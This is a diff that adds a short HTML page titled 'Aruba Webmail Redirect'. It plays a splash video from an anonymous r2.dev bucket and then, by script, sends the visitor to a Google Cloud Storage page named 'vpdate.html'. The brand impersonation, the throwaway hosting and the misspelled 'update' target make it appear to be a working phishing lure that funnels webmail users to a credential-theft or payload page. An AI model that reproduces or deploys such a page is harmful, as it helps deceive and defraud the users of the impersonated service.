@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Aruba Webmail Redirect</title>
+
+<style>
+body{
+    margin:0;
+    padding:0;
+    overflow:hidden;
+}
+
+/* Splash Screen */
+#video-splash{
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:#ffffff;
+    z-index:9999;
+}
+
+#splash-video{
+    width:100%;
+    height:100%;
+    object-fit:cover;
+}
+</style>
+
+</head>
+
+<body>
+
+<div id="video-splash">
+    <video autoplay muted playsinline id="splash-video">
+        <source src="https://pub-3753a50cf99b4613b10793dc0ca228c9.r2.dev/Aruba%20Webmail/assets/img/animation.mp4" type="video/mp4">
+    </video>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+
+    const video = document.getElementById("splash-video");
+
+    video.addEventListener("ended", function() {
+        window.location.href = "https://storage.googleapis.com/pspil/vpdate.html";
+    });
+
+});
+</script>
+
+</body>
+</html>
